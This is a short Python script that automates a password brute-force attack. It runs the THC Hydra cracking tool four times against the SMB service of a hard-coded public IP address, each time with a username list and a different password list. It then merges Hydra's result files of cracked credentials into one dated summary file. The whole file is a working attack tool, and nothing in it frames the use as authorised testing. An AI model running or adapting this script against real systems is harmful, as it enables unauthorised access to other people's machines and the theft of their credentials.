import os,time

realTime = time.strftime("%Y%m%d", time.localtime())
#print(realTime)
toPath = r"C:\adtest\re\汇总" + str(realTime) + ".txt"
result = list()
for i in range(1,5):
    res = os.system(r"start C:\Users\chenbintest\Desktop\thc-hydra-windows-master\hydra.exe   -L C:\adtest\user.txt -P C:\adtest\pa\pass"+str(i)+r".txt -o C:\adtest\re\re"+str(i)+".txt 123.128.65.178 smb")
    time.sleep(3)
    path = r"C:\adtest\re\re"+ str(i) + ".txt"
    f1 = open(path,mode='r')
    for line in f1.readlines():
        result.append(line)
    f1.close()
#open(toPath, 'w').write('%s' % '\n'.join(result))
open(toPath, 'w').write('%s' % ''.join(result))





























